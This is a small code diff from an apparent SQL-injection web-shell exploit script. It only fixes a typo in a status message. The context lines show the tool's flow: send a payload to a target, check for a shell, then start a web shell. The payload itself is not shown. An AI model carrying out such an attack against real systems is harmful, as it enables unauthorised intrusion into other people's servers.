@@ -77,7 +77,7 @@ Type: Webshell (sql injection)
         print(f"{G}"+"[+] TARGET is alive!" + f"{RS}")
         sendPayload()
         if checkShell():
-            print(f"{G}"+"[+] SHELL Acitvating!" + f"{RS}")
+            print(f"{G}"+"[+] SHELL Activating!" + f"{RS}")
             time.sleep(1)
             runWebShell()
 
